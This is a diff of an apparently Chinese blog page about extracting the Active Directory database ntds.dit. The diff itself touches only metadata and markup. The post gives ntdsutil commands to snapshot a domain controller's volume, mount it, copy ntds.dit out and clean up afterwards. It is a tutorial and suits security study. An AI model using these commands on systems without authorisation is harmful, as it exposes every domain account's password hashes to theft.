@@ -87,13 +87,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    3k
+                    2.4k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
-                    3 mins.
+                    2 mins.
                 </span>
                 
                 
@@ -135,16 +135,16 @@
 <li>vssadmin: Windows 7/Windows Server 2008</li>
 </ul>
 <p>这里用12的机器做示范：</p>
-<figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit	//创建一个快照</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit	//创建一个快照</span><br></pre></td></tr></table></figure>
 <p>快照包含Windows中的所有文件，并且复制的时候不会影响Windows本机，也不会受到限制<br><img src="/2020/02/28/Windows下ntds-dit的利用/1.png" alt></p>
-<figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit	//加载快照</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit	//加载快照</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/02/28/Windows下ntds-dit的利用/2.png" alt><br>这个时候会映射出一个文件夹出来，GUID为每次生成镜像的GUID</p>
-<p>然后用命令将ntds.dit复制出来<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202002282030_VOLUMEC$\windows\ntds\ntds.dit</span><br><span class="line"> c:\temp\ntds.dit</span><br></pre></td></tr></table></div></figure></p>
+<p>然后用命令将ntds.dit复制出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202002282030_VOLUMEC$\windows\ntds\ntds.dit</span><br><span class="line"> c:\temp\ntds.dit</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2020/02/28/Windows下ntds-dit的利用/3.png" alt></p>
 <p>最后删除卸载快照</p>
-<figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/02/28/Windows下ntds-dit的利用/4.png" alt></p>
-<p>执行以下命令，若List为空，则说明卸载成功<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></div></figure></p>
+<p>执行以下命令，若List为空，则说明卸载成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2020/02/28/Windows下ntds-dit的利用/5.png" alt></p>
 <p>这就是ntdsutil的用法，win7下没有这个工具，需要利用vssadmin，这里没有win7域控的环境就先不搞了<br><img src="/2020/02/28/Windows下ntds-dit的利用/win7.png" alt></p>
 
